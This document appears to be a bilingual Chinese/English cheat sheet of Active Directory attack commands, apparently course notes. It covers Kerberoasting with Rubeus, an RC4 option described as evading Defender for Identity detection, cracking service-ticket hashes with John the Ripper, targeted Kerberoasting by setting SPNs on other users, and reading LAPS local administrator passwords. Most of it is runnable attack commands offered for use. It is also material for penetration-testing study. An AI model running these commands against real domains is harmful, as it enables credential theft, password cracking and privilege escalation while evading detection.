# Kerberoast

ActiveDirectory module
```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
PowerView
```
Get-DomainUser –SPN
```

## 使用 Rubeus 列出 Kerberoast stats
```
Rubeus.exe kerberoast /stats
```

## 使用 Rubeus 请求 TGS
```
Rubeus.exe kerberoast /user:serviceaccount /simple
```

为了避免基于Kerberos ET类型的加密降级的检测（由MDI等使用 - 0x17 代表RC4-HMAC），寻找只支持RC4_HMAC的Kerberoastable账户
```
Rubeus.exe kerberoast /stats /rc4opsec

Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec
```

## 列出所有可以Kerberoast的账号
```
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

## 破解Kerberoast用户的ticket
```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

# Targeted Kerberoasting - Set SPN

前提：
> If we have sufficient rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).(如果我们有足够的权限（GenericAll/GenericWrite），目标用户的SPN可以被设置为任何东西（在域中唯一的）)

> We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".(然后我们可以请求一个没有特殊权限的TGS。然后TGS可以被 "Kerberoasted"。)

## 枚举指定账号的特别的ACL
```
Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match "StudentUsers"}
```

## 枚举用户是否已经有SPN
使用powerview
```
Get-DomainUser -Identity support1user | select serviceprincipalname
```
使用ActiveDirectory module
```
Get-ADUser -Identity support1user -Properties ServicePrincipalName | select ServicePrincipalName
```

## 为指定用户设置SPN
使用powerview
```
Set-DomainObject -Identity support1user -Set @{serviceprincipalname='us/myspnX X'}
```
使用ActiveDirectory module
```
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='us/myspnX X'}
```

## Kerberoast the user
```
Rubeus.exe kerberoast /outfile:targetedhashes.txt

john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
```


# LAPS

LAPS (Local Administrator Password Solution) provides centralized storage of local users passwords in AD with periodic randomizing.（LAPS（本地管理员密码解决方案）通过定期随机化在 AD 中提供本地用户密码的集中存储。）

1. "…it mitigates the risk of lateral escalation that results when customers have the same administrative local account and password combination on many computers."
2. Storage in clear text, transmission is encrypted (Kerberos).（以明文存储，传输是加密的（Kerberos））
3. Configurable using GPO.（可使用GPO进行配置）
4. Access control for reading clear text passwords using ACLs. Only Domain Admins and explicitly allowed users can read the passwords.（使用ACL对读取明文密码进行访问控制。只有域名管理员和明确允许的用户可以读取密码。）


## 可以使用 LAPS的计算机
在下面路径可以找到 AdmPwd.dll这个文件
```
C:\Program Files\LAPS\CSE\directory
```

## 查找哪些用户可以使用LAPS读取明文密码

使用PowerView
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

使用Active Directory module
```
Get-LapsPermissions.ps1
```

使用LAPS module
```
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1

Find-AdmPwdExtendedRights -Identity OUDistinguishedName
```

## 使用有权限使用LAPS的用户读取明文密码

使用PowerView
```
Get-DomainObject -Identity <targetmachine$> | select -ExpandProperty ms-mcs-admpwd
```

使用 Active Directory module
```
Get-ADComputer -Identity <targetmachine> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```

使用LAPS module
```
Get-AdmPwdPassword -ComputerName <targetmachine>
```

